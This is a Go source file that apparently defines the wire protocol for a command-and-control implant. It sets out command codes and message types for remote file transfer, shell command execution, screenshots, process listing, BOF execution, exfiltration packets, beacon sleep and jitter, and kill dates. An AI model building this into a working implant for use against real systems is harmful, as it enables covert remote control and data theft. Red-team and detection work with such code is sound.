package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"

	"github.com/vmihailenco/msgpack/v5"
)

// ─── Codec ─────────────────────────────────────────────────────────────────────

func Marshal(v interface{}) ([]byte, error) {
	return msgpack.Marshal(v)
}

func Unmarshal(data []byte, v interface{}) error {
	return msgpack.Unmarshal(data, v)
}

// ─── Command codes ─────────────────────────────────────────────────────────────

const (
	COMMAND_EXIT    = 0
	COMMAND_UNKNOWN = 1

	COMMAND_FS_LIST     = 10
	COMMAND_FS_UPLOAD   = 11
	COMMAND_FS_DOWNLOAD = 12
	COMMAND_FS_REMOVE   = 13
	COMMAND_FS_MKDIRS   = 14
	COMMAND_FS_COPY     = 15
	COMMAND_FS_MOVE     = 16

	COMMAND_OS_RUN        = 20
	COMMAND_OS_INFO       = 21
	COMMAND_OS_PS         = 22
	COMMAND_OS_SCREENSHOT = 23

	COMMAND_PROFILE_SLEEP    = 40
	COMMAND_PROFILE_KILLDATE = 41
	COMMAND_PROFILE_WORKTIME = 42

	COMMAND_EXEC_BOF       = 50
	COMMAND_EXEC_BOF_OUT   = 51
	COMMAND_EXEC_BOF_ASYNC = 52

	COMMAND_JOB_LIST = 60
	COMMAND_JOB_KILL = 61

	RESP_COMPLETE      = 0
	RESP_ERROR         = 1
	RESP_FS_LIST       = 10
	RESP_FS_UPLOAD     = 11
	RESP_FS_DOWNLOAD   = 12
	RESP_OS_RUN        = 20
	RESP_OS_INFO       = 21
	RESP_OS_PS         = 22
	RESP_OS_SCREENSHOT = 23

	EXFIL_PACK = 100
	JOB_PACK   = 101
	BOF_PACK   = 102
)

// ─── BOF callback & error codes ────────────────────────────────────────────────

const (
	CALLBACK_OUTPUT      = 0x0
	CALLBACK_OUTPUT_OEM  = 0x1e
	CALLBACK_OUTPUT_UTF8 = 0x20
	CALLBACK_ERROR       = 0x0d
	CALLBACK_CUSTOM      = 0x1000
	CALLBACK_CUSTOM_LAST = 0x13ff

	CALLBACK_AX_SCREENSHOT   = 0x81
	CALLBACK_AX_DOWNLOAD_MEM = 0x82

	BOF_ERROR_PARSE     = 0x101
	BOF_ERROR_SYMBOL    = 0x102
	BOF_ERROR_MAX_FUNCS = 0x103
	BOF_ERROR_ENTRY     = 0x104
	BOF_ERROR_ALLOC     = 0x105
)

// ─── Wire types ────────────────────────────────────────────────────────────────

type Profile struct {
	Type        uint     `msgpack:"type"`
	Addresses   []string `msgpack:"addresses"`
	BannerSize  int      `msgpack:"banner_size"`
	ConnTimeout int      `msgpack:"conn_timeout"`
	ConnCount   int      `msgpack:"conn_count"`
	UseSSL      bool     `msgpack:"use_ssl"`
	SslCert     []byte   `msgpack:"ssl_cert"`
	SslKey      []byte   `msgpack:"ssl_key"`
	CaCert      []byte   `msgpack:"ca_cert"`
	Sleep       int      `msgpack:"sleep"`
	Jitter      int      `msgpack:"jitter"`
	KillDate    int64    `msgpack:"kill_date"`
	WorkStart   int      `msgpack:"work_start"`
	WorkEnd     int      `msgpack:"work_end"`
}

type SessionInfo struct {
	Hostname    string `msgpack:"hostname"`
	Username    string `msgpack:"username"`
	Domain      string `msgpack:"domain"`
	InternalIP  string `msgpack:"internal_ip"`
	Os          string `msgpack:"os"`
	OsVersion   string `msgpack:"os_version"`
	OsArch      string `msgpack:"os_arch"`
	Elevated    bool   `msgpack:"elevated"`
	ProcessId   uint32 `msgpack:"process_id"`
	ProcessName string `msgpack:"process_name"`
	CodePage    uint32 `msgpack:"code_page"`
	Sleep       string `msgpack:"sleep"`
}

type Message struct {
	Type   int8     `msgpack:"type"`
	Object [][]byte `msgpack:"object"`
}

type Command struct {
	Code uint   `msgpack:"code"`
	Id   uint   `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

// ─── Request param types ───────────────────────────────────────────────────────

type ParamsExit struct{}

type ParamsFsList struct {
	Path string `msgpack:"path"`
}

type ParamsFsUpload struct {
	Path string `msgpack:"path"`
	Data []byte `msgpack:"data"`
}

type ParamsFsDownload struct {
	Path string `msgpack:"path"`
}

type ParamsFsRemove struct {
	Path string `msgpack:"path"`
}

type ParamsFsMkdirs struct {
	Path string `msgpack:"path"`
}

type ParamsFsCopy struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsFsMove struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsOsRun struct {
	Command string `msgpack:"command"`
	Output  bool   `msgpack:"output"`
	Wait    bool   `msgpack:"wait"`
}

type ParamsOsInfo struct{}

type ParamsOsPs struct{}

type ParamsOsScreenshot struct{}

type ParamsProfileSleep struct {
	Sleep  int `msgpack:"sleep"`
	Jitter int `msgpack:"jitter"`
}

type ParamsProfileKilldate struct {
	KillDate int64 `msgpack:"kill_date"`
}

type ParamsProfileWorktime struct {
	WorkStart int `msgpack:"work_start"`
	WorkEnd   int `msgpack:"work_end"`
}

// ─── Response answer types ─────────────────────────────────────────────────────

type AnsError struct {
	Message string `msgpack:"message"`
}

type AnsOsInfo struct {
	Hostname    string `msgpack:"hostname"`
	Username    string `msgpack:"username"`
	Domain      string `msgpack:"domain"`
	InternalIP  string `msgpack:"internal_ip"`
	Os          string `msgpack:"os"`
	OsVersion   string `msgpack:"os_version"`
	OsArch      string `msgpack:"os_arch"`
	Elevated    bool   `msgpack:"elevated"`
	ProcessId   uint32 `msgpack:"process_id"`
	ProcessName string `msgpack:"process_name"`
	CodePage    uint32 `msgpack:"code_page"`
}

type DirEntry struct {
	Name    string `msgpack:"name"`
	IsDir   bool   `msgpack:"is_dir"`
	Size    int64  `msgpack:"size"`
	ModTime int64  `msgpack:"mod_time"`
}

type AnsFsList struct {
	Path    string     `msgpack:"path"`
	Entries []DirEntry `msgpack:"entries"`
}

type AnsFsUpload struct {
	Path string `msgpack:"path"`
}

type AnsFsDownload struct {
	Path string `msgpack:"path"`
	Data []byte `msgpack:"data"`
}

type AnsOsRun struct {
	Output string `msgpack:"output"`
}

type ProcessEntry struct {
	Pid     uint32 `msgpack:"pid"`
	PPid    uint32 `msgpack:"ppid"`
	Name    string `msgpack:"name"`
	User    string `msgpack:"user"`
	Arch    string `msgpack:"arch"`
	Session uint32 `msgpack:"session"`
}

type AnsOsPs struct {
	Processes []ProcessEntry `msgpack:"processes"`
}

type AnsOsScreenshot struct {
	Image []byte `msgpack:"image"`
}

type AnsExfil struct {
	CommandId uint   `msgpack:"command_id"`
	Data      []byte `msgpack:"data"`
}

// ─── Job type (async / JOB_PACK) ──────────────────────────────────────────────

type Job struct {
	CommandId uint   `msgpack:"command_id"`
	JobId     string `msgpack:"job_id"`
	Data      []byte `msgpack:"data"`
}

// ─── BOF types ─────────────────────────────────────────────────────────────────

type ParamsExecBof struct {
	Object   []byte `msgpack:"object"`
	ArgsPack string `msgpack:"argspack"`
	Task     string `msgpack:"task"`
}

type BofMsg struct {
	Type int    `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type AnsExecBof struct {
	Msgs []byte `msgpack:"msgs"`
}

type AnsExecBofAsync struct {
	Msgs   []byte `msgpack:"msgs"`
	Start  bool   `msgpack:"start"`
	Finish bool   `msgpack:"finish"`
}

type ParamsJobKill struct {
	Id string `msgpack:"id"`
}

type JobInfo struct {
	JobId   string `msgpack:"job_id"`
	JobType int    `msgpack:"job_type"`
}

type AnsJobList struct {
	List []byte `msgpack:"list"`
}

// ─── Helpers ───────────────────────────────────────────────────────────────────

func ZipBytes(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	f, err := w.Create("data")
	if err != nil {
		return nil, err
	}
	if _, err = f.Write(data); err != nil {
		return nil, err
	}
	if err = w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func UnzipBytes(data []byte) ([]byte, error) {
	r, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		return nil, err
	}
	if len(r.File) == 0 {
		return nil, fmt.Errorf("empty zip")
	}
	rc, err := r.File[0].Open()
	if err != nil {
		return nil, err
	}
	defer rc.Close()
	return io.ReadAll(rc)
}

func SizeBytesToFormat(size int64) string {
	const (
		KB = 1024
		MB = KB * 1024
		GB = MB * 1024
	)
	switch {
	case size >= GB:
		return fmt.Sprintf("%.2f GB", float64(size)/GB)
	case size >= MB:
		return fmt.Sprintf("%.2f MB", float64(size)/MB)
	case size >= KB:
		return fmt.Sprintf("%.2f KB", float64(size)/KB)
	default:
		return fmt.Sprintf("%d B", size)
	}
}

func ensureNewline(s string) string {
	if len(s) > 0 && s[len(s)-1] != '\n' {
		return s + "\n"
	}
	return s
}
